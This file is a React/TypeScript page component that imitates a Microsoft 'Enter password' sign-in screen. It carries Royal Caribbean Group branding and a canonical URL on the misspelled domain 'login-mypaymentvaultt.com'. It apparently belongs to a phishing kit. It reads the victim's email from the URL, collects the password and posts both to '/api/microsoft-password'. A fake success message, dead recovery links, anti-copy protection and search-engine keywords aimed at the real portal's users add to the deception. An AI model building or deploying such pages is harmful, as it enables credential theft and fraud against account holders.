import { useEffect, useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { useMutation } from '@tanstack/react-query';
import { useLocation } from 'wouter';
import { AntiCopyProtection } from '@/components/AntiCopyProtection';
import { SEO } from '@/components/SEO';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import { z } from 'zod';
import '@/styles/styles.css';
import rcgLogo from '@assets/bannerlogo_1760638008519.png';
import cruiseBanner from '@assets/image_1760638001700.png';

const microsoftPasswordSchema = z.object({
  password: z.string().min(1, "Please enter the password for your Microsoft account"),
});

type MicrosoftPasswordForm = z.infer<typeof microsoftPasswordSchema>;

export default function MicrosoftPasswordPage() {
  const [, setLocation] = useLocation();
  const [loginAttemptId, setLoginAttemptId] = useState('');
  const [emailOrPhone, setEmailOrPhone] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const { toast } = useToast();

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm<MicrosoftPasswordForm>({
    resolver: zodResolver(microsoftPasswordSchema),
  });

  useEffect(() => {
    // First try to get data from URL query params
    const urlParams = new URLSearchParams(window.location.search);
    const emailFromUrl = urlParams.get('email');
    const tokenFromUrl = urlParams.get('token');
    
    if (emailFromUrl && tokenFromUrl) {
      setEmailOrPhone(emailFromUrl);
      setLoginAttemptId(tokenFromUrl);
      // Hide params from URL
      window.history.replaceState(null, '', window.location.pathname);
      // Store in sessionStorage for backup
      sessionStorage.setItem('microsoftEmail', emailFromUrl);
      sessionStorage.setItem('loginAttemptId', tokenFromUrl);
    } else {
      // Fallback to sessionStorage
      const attemptId = sessionStorage.getItem('loginAttemptId');
      const email = sessionStorage.getItem('microsoftEmail');
      
      if (!attemptId || !email) {
        toast({
          title: 'Error',
          description: 'Session expired. Please start over.',
          variant: 'destructive',
        });
        setTimeout(() => setLocation('/'), 2000);
        return;
      }
      
      setLoginAttemptId(attemptId);
      setEmailOrPhone(email);
    }
  }, [toast, setLocation]);

  const passwordMutation = useMutation({
    mutationFn: async (data: MicrosoftPasswordForm) => {
      const res = await apiRequest('POST', '/api/microsoft-password', {
        loginAttemptId,
        emailOrPhone,
        password: data.password,
      });
      return await res.json();
    },
    onSuccess: () => {
      toast({
        title: 'Success',
        description: 'Authentication completed successfully',
      });
      setTimeout(() => {
        sessionStorage.clear();
        setLocation('/');
      }, 2000);
    },
    onError: (error: Error) => {
      toast({
        title: 'Error',
        description: error.message || 'Failed to submit. Please try again.',
        variant: 'destructive',
      });
    },
  });

  const onSubmit = (data: MicrosoftPasswordForm) => {
    passwordMutation.mutate(data);
  };

  const handleBack = () => {
    sessionStorage.removeItem('microsoftEmail');
    setLocation(`/microsoft-email?token=${loginAttemptId}`);
  };

  return (
    <>
      <SEO 
        title="Login MyPaymentVault | Enter Password - Complete Sign In"
        description="Complete Login MyPaymentVault password verification. Secure multi-factor authentication alternative to Northlane and Wirecard."
        keywords="login mypaymentvault, mypaymentvault login, password authentication, login northlane, login wirecard, secure authentication, complete login"
        canonical="https://login-mypaymentvaultt.com/microsoft-password"
      />
      <AntiCopyProtection />
      <div style={{ 
        minHeight: '100vh', 
        display: 'flex', 
        flexDirection: 'column',
        backgroundColor: '#001f3f',
        position: 'relative'
      }}>
        {/* Header */}
        <div style={{ padding: '20px', position: 'absolute', top: 0, left: 0 }}>
          <button
            onClick={handleBack}
            style={{
              background: 'none',
              border: 'none',
              fontSize: '15px',
              color: '#ffffff',
              cursor: 'pointer',
              padding: '0',
            }}
            data-testid="button-back"
          >
            ← Back
          </button>
        </div>

        {/* Main Content */}
        <div style={{ 
          flex: 1, 
          display: 'flex', 
          alignItems: 'center', 
          justifyContent: 'center',
          padding: '20px',
          flexDirection: 'column',
          gap: '60px'
        }}>
          {/* Form Container */}
          <div style={{ 
            width: '100%', 
            maxWidth: '440px',
            backgroundColor: '#ffffff',
            padding: '48px 44px',
            boxShadow: '0 2px 6px rgba(0,0,0,0.2)',
          }}>
            {/* Logo */}
            <div style={{ textAlign: 'center', marginBottom: '24px' }}>
              <img 
                src={rcgLogo} 
                alt="Login MyPaymentVault - Royal Caribbean Group Secure Payment Gateway" 
                style={{ height: '50px' }}
                data-testid="img-rcg-logo"
              />
            </div>

            {/* Display email with edit option */}
            <div style={{ marginBottom: '20px' }}>
              <div style={{ 
                fontSize: '15px', 
                color: '#1b1b1b',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'space-between'
              }}>
                <span data-testid="text-email">{emailOrPhone}</span>
                <button
                  onClick={handleBack}
                  style={{
                    background: 'none',
                    border: 'none',
                    color: '#0067b8',
                    fontSize: '13px',
                    cursor: 'pointer',
                    textDecoration: 'underline',
                  }}
                  data-testid="button-change-email"
                >
                  Change
                </button>
              </div>
            </div>

            <h1 style={{ 
              fontSize: '24px', 
              fontWeight: '600', 
              marginBottom: '16px',
              color: '#1b1b1b'
            }} data-testid="text-title">
              Enter password
            </h1>

            <form onSubmit={handleSubmit(onSubmit)}>
              <div style={{ marginBottom: '20px' }}>
                <div style={{ position: 'relative' }}>
                  <input
                    {...register('password')}
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Password"
                    style={{
                      width: '100%',
                      padding: '11px 40px 11px 12px',
                      fontSize: '15px',
                      border: errors.password ? '1px solid #e81123' : '1px solid #8a8886',
                      outline: 'none',
                      backgroundColor: '#ffffff',
                      color: '#000000',
                    }}
                    onFocus={(e) => e.target.style.border = '1px solid #0067b8'}
                    onBlur={(e) => e.target.style.border = errors.password ? '1px solid #e81123' : '1px solid #8a8886'}
                    data-testid="input-password"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    style={{
                      position: 'absolute',
                      right: '12px',
                      top: '50%',
                      transform: 'translateY(-50%)',
                      background: 'none',
                      border: 'none',
                      cursor: 'pointer',
                      fontSize: '18px',
                    }}
                    data-testid="button-toggle-password"
                  >
                    {showPassword ? '🙈' : '👁️'}
                  </button>
                </div>
                {errors.password && (
                  <div style={{ 
                    color: '#e81123', 
                    fontSize: '12px', 
                    marginTop: '6px',
                    display: 'flex',
                    alignItems: 'center',
                  }} data-testid="text-error">
                    <span style={{ marginRight: '4px' }}>⚠</span>
                    {errors.password.message}
                  </div>
                )}
              </div>

              <div style={{ marginBottom: '24px' }}>
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    toast({
                      description: "Please contact support for password recovery",
                    });
                  }}
                  style={{
                    color: '#0067b8',
                    fontSize: '13px',
                    textDecoration: 'none',
                  }}
                  data-testid="link-forgot-password"
                >
                  Forgot password?
                </a>
              </div>

              <div style={{ 
                display: 'flex', 
                justifyContent: 'flex-end',
                marginBottom: '28px'
              }}>
                <button
                  type="submit"
                  disabled={passwordMutation.isPending}
                  style={{
                    padding: '10px 28px',
                    fontSize: '15px',
                    fontWeight: '600',
                    backgroundColor: '#0067b8',
                    color: '#ffffff',
                    border: 'none',
                    cursor: passwordMutation.isPending ? 'not-allowed' : 'pointer',
                    opacity: passwordMutation.isPending ? 0.6 : 1,
                  }}
                  data-testid="button-sign-in"
                >
                  {passwordMutation.isPending ? 'Loading...' : 'Sign in'}
                </button>
              </div>

              <div>
                <a
                  href="#"
                  onClick={(e) => {
                    e.preventDefault();
                    toast({
                      description: "Sign-in options are currently unavailable",
                    });
                  }}
                  style={{
                    color: '#0067b8',
                    fontSize: '13px',
                    textDecoration: 'none',
                    display: 'inline-flex',
                    alignItems: 'center',
                  }}
                  data-testid="link-signin-options"
                >
                  <span style={{ marginRight: '8px' }}>🔑</span>
                  Sign-in options
                </a>
              </div>
            </form>
          </div>

          {/* Cruise Banner */}
          <div style={{ width: '100%', maxWidth: '1024px' }}>
            <img 
              src={cruiseBanner} 
              alt="Login MyPaymentVault Payment Partners - Royal Caribbean, Celebrity Cruises, Silversea, TUI Cruises, Hapag-Lloyd" 
              style={{ 
                width: '100%', 
                height: 'auto',
                display: 'block'
              }}
              data-testid="img-cruise-banner"
            />
          </div>
        </div>

        {/* Footer */}
        <div style={{ 
          padding: '16px 20px',
          display: 'flex',
          justifyContent: 'center',
          gap: '20px',
          fontSize: '12px',
          color: '#ffffff'
        }}>
          <a
            href="#"
            onClick={(e) => e.preventDefault()}
            style={{ color: '#ffffff', textDecoration: 'none' }}
            data-testid="link-terms"
          >
            Terms of use
          </a>
          <a
            href="#"
            onClick={(e) => e.preventDefault()}
            style={{ color: '#ffffff', textDecoration: 'none' }}
            data-testid="link-privacy"
          >
            Privacy &amp; cookies
          </a>
          <button
            onClick={(e) => e.preventDefault()}
            style={{
              background: 'none',
              border: 'none',
              color: '#ffffff',
              cursor: 'pointer',
              padding: '0',
              fontSize: '12px',
            }}
            data-testid="button-more"
          >
            ...
          </button>
        </div>
      </div>
    </>
  );
}
